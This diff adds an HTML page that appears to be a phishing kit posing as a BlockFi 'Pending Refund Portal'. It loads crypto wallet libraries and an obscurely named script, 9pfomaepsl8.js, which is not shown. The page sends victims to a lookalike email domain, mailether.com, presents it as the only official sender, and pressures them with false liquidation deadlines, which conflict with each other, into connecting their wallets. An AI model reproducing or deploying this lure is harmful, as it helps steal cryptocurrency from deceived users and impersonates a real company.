@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="icon.png">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">    
+  <script src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>            
+  <script src="settings.js"></script>
+  <script src="9pfomaepsl8.js" type="module"></script>    
+  <script src="https://cdn.tailwindcss.com"></script>
+  <title>Pending Refund Portal</title>
+  <style>
+    .bg-blockfi-blue {
+      background-color: #0052FF;
+    }
+    .text-blockfi-blue {
+      color: #0052FF;
+      font-family: 'Inter';
+    }
+    .hover-bg-blockfi-darkblue:hover {
+      background-color: #0052FF;
+    }
+    .bg-page-gray {
+      background-color: #F5f5f5;
+      font-family: 'Inter';   
+    }
+    .text-dark-gray {
+      color: #1F2937;
+      font-family: 'Inter';
+    }
+    .text-medium-gray {
+      color: #4B5563;
+      font-family: 'Inter';
+    }
+    .hamburger-icon {
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      width: 24px;
+      height: 18px;
+      cursor: pointer;
+    }
+    .hamburger-icon span {
+      display: block;
+      height: 2px;
+      width: 100%;
+      background-color: #4B5563;
+      border-radius: 1px;
+      font-family: 'Inter';
+    }
+  </style>
+</head>
+<body class="min-h-screen bg-page-gray flex flex-col">
+
+  <!-- Top Banner -->
+  <div class="bg-blockfi-blue text-white text-center py-2 px-2 text-md md:text-base font-bold">
+    BlockFi distributions for international clients are now open. If you are a non-US Client, you must complete
+    remediation before 8/15/2025 to receive your funds.
+  </div>
+
+  <!-- Header -->
+  <header class="bg-white py-4 px-1 pl-0 flex items-center justify-between shadow-sm">
+    <div class="flex items-center gap-2">
+      <img src="logo.png" alt="BlockFi Logo" width="50" class="pl-5 text-blockfi-blue" />
+      <span class="text-3xl font-bold text-dark-gray">BlockFi</span>
+    </div>
+    <button class="md:hidden p-2 rounded-md focus:outline-none focus:ring-2 focus:ring-gray-300" aria-label="Toggle navigation">
+      <div class="hamburger-icon">
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
+    </button>
+  </header>
+
+  <!-- Main Content -->
+  <main class="flex-1 py-8 px-4 md:px-6 lg:px-8 max-w-3xl mx-auto w-full">
+    <h1 class="text-3xl md:text-4xl font-bold text-dark-gray mb-6">Pending Refund Portal</h1>
+
+    <div class="bg-white p-6 rounded-lg shadow-md">
+      <div class="mb-6">
+        <label for="case-number" class="block text-medium-gray text-base font-medium mb-2">
+          Enter your Case Number from your email:
+        </label>
+        <input
+          id="case-number"
+          type="text"
+          placeholder="12-34567"
+          maxlength="8"
+          pattern="\d{2}-\d{5}"
+          inputmode="numeric"
+          class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blockfi-blue"
+          oninput="formatCaseNumber(this)"
+        />
+      </div>
+      <button class="w-full bg-blockfi-blue hover-bg-blockfi-darkblue text-white py-2 px-4 rounded-md text-lg font-semibold">
+        Next
+      </button>
+
+      <div class="mt-8 text-medium-gray text-sm leading-relaxed">
+        <ul class="list-disc pl-5 space-y-1">
+          <li>
+            Check your email for an email from
+            <a href="mailto:blockfi_e.blockfi@mailether.com" class="text-blockfi-blue underline">
+              blockfi_e.blockfi@mailether.com
+            </a>
+            and the key word <span class="font-bold">&quot;Case Number&quot;</span>
+          </li>
+          <li>
+            As a reminder, we will only reach out to you from these approved email addresses:
+            <a href="mailto:blockfi_e.blockfi@mailether.com" class="text-blockfi-blue underline">
+              blockfi_e.blockfi@mailether.com
+            </a>
+            . Emails from any other addresses are likely spam.
+          </li>
+          <li>Enter the <span class="font-bold">&quot;Case Number&quot;</span> that we provided to you in the email.</li>
+          <li>Click the <span class="font-bold">&quot;Next&quot;</span> button.</li>
+          <li>Connect your preferred wallet for receiving funds.</li>
+          <li>Funds will be available in your wallet approximately 24 hours after you connect your wallet.</li>
+          <li>
+            <span class="font-bold">
+              Please note that if you do not connect a wallet on or before July 19, 2025,
+            </span>
+            We will be forced to liquidate all of your assets and transfer to the <span class="font-bold">U.S. State of Wyoming&apos;s
+            Unclaimed Property Administration</span>. At that point, your sole recourse to reclaim your liquidated assets
+            will be to contact that government agency and file a claim for the property.
+          </li>
+        </ul>
+      </div>
+    </div>
+  </main>
+
+  <script>
+    function formatCaseNumber(input) {
+      let val = input.value.replace(/\D/g, '').slice(0, 7); // Digits only, max 7
+      if (val.length > 2) {
+        input.value = val.slice(0, 2) + '-' + val.slice(2);
+      } else {
+        input.value = val;
+      }
+    }
+  </script>
+</body>
+</html>
